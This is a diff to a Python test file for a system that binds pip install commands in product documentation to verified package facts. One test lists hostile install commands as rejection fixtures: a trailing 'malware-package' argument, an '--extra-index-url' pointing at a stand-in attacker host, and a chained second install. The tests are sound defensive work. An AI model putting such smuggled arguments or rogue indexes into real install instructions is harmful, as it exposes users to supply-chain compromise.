@@ -13,7 +13,7 @@ def _facts() -> ProductFactsV2:
         "api.public_surface": {"modules": [], "classes": [{"name": "PdfLoadLimits"}]},
         "development.assets": {"tests": {"count": 2}},
         "development.commands": {"entries": [{"command": "python -m ruff check src/"}]},
-        "installation.coordinates": [{"name": "aspose-pdf-foss-for-python"}],
+        "installation.coordinates": [{"ecosystem": "python", "name": "aspose-pdf-foss-for-python"}],
         "installation.optional_extras": {
             "manifest_path": "pyproject.toml",
             "extras": {
@@ -22,7 +22,13 @@ def _facts() -> ProductFactsV2:
                 "woff2": ["Brotli>=1.0"],
             },
         },
-        "installation.verified_acquisition": {"method": "source_build"},
+        "installation.verified_acquisition": {
+            "ecosystem": "python",
+            "method": "source_build",
+            "outcome": "SOURCE_BUILD_VERIFIED",
+            "source_build_receipt": {"truth_eligible": True},
+            "truth_eligible": True,
+        },
         "python.distribution": {"runtime_dependencies": ["cryptography>=42", "asn1crypto>=1.5"]},
         "repository.ci": {"path": ".github/workflows/ci.yml"},
         "repository.contribution_guidance": {"validation_scripts": [{"path": "scripts/check.sh"}]},
@@ -76,14 +82,14 @@ def _facts() -> ProductFactsV2:
     )
 
 
-def _binding(source: str, fragment: str):
+def _binding(source: str, fragment: str, facts: ProductFactsV2 | None = None):
     claim = next(
         claim
         for claim in assess_material_claims(source)
         if fragment
         in source.encode("utf-8")[claim.source_byte_start : claim.source_byte_end].decode("utf-8")
     )
-    return complete_source_claim_fact_binding(source, claim, _facts())
+    return complete_source_claim_fact_binding(source, claim, facts or _facts())
 
 
 def test_dependency_details_bind_to_manifest_facts() -> None:
@@ -96,13 +102,138 @@ def test_dependency_details_bind_to_manifest_facts() -> None:
 Optional extras add Pillow, Brotli WOFF2, and HarfBuzz/bidi text layout.
 
 ```bash
-python -m pip install 'aspose-pdf-foss-for-python[images,woff2,text-layout]'
+python -m pip install '.[images,woff2,text-layout]'
 ```
 """
 
     assert _binding(source, "cryptography") is not None
     assert _binding(source, "Pillow") is not None
     assert _binding(source, "pip install") is not None
+
+
+def test_source_build_does_not_bind_a_registry_target_for_optional_extras() -> None:
+    source = """# Product
+
+## Requirements
+
+```bash
+python -m pip install 'aspose-pdf-foss-for-python[images,woff2,text-layout]'
+```
+"""
+
+    assert _binding(source, "pip install") is None
+
+
+def test_non_python_product_does_not_bind_python_optional_extras() -> None:
+    facts = _facts()
+    non_python = facts.model_copy(
+        update={
+            "facts": [
+                fact.model_copy(update={"value": {**fact.value, "ecosystem": "java"}})
+                if fact.field == "product.identity" and isinstance(fact.value, dict)
+                else fact
+                for fact in facts.facts
+            ]
+        }
+    )
+    source = """# Product
+
+## Requirements
+
+```bash
+python -m pip install '.[images]'
+```
+"""
+
+    assert _binding(source, "pip install", non_python) is None
+
+
+def test_failed_source_build_does_not_bind_python_optional_extras() -> None:
+    facts = _facts()
+    failed = facts.model_copy(
+        update={
+            "facts": [
+                fact.model_copy(
+                    update={
+                        "value": {
+                            "ecosystem": "python",
+                            "method": "source_build",
+                            "outcome": "SOURCE_BUILD_FAILED",
+                            "truth_eligible": False,
+                        }
+                    }
+                )
+                if fact.field == "installation.verified_acquisition"
+                else fact
+                for fact in facts.facts
+            ]
+        }
+    )
+    source = """# Product
+
+## Requirements
+
+```bash
+python -m pip install '.[images]'
+```
+"""
+
+    assert _binding(source, "pip install", failed) is None
+
+
+def test_optional_extras_binding_rejects_trailing_shell_content() -> None:
+    commands = (
+        "python -m pip install '.[images]' malware-package",
+        "python -m pip install '.[images]' --extra-index-url https://attacker.invalid/simple",
+        "python -m pip install '.[images]' && python -m pip install malware-package",
+    )
+
+    for command in commands:
+        source = f"# Product\n\n## Requirements\n\n```bash\n{command}\n```\n"
+        assert _binding(source, "pip install") is None, command
+
+
+def test_registry_extras_bind_only_to_the_receipt_selected_coordinate() -> None:
+    facts = _facts()
+    replacements = {
+        "installation.coordinates": [
+            {"ecosystem": "python", "name": "verified-package"},
+            {"ecosystem": "python", "name": "unverified-sibling"},
+        ],
+        "installation.verified_acquisition": {
+            "ecosystem": "python",
+            "method": "pypi",
+            "outcome": "REGISTRY_VERIFIED",
+            "coordinate": {"name": "verified-package"},
+            "registry_receipt": {
+                "coordinate": {"name": "verified-package"},
+                "found": True,
+            },
+            "truth_eligible": True,
+        },
+    }
+    registry_facts = facts.model_copy(
+        update={
+            "facts": [
+                fact.model_copy(update={"value": replacements[fact.field]})
+                if fact.field in replacements
+                else fact
+                for fact in facts.facts
+            ]
+        }
+    )
+    verified = """# Product
+
+## Requirements
+
+```bash
+python -m pip install 'verified-package[images]'
+```
+"""
+    sibling = verified.replace("verified-package", "unverified-sibling")
+
+    assert _binding(verified, "pip install", registry_facts) is not None
+    assert _binding(sibling, "pip install", registry_facts) is None
 
 
 def test_unknown_dependency_remains_unbound() -> None:
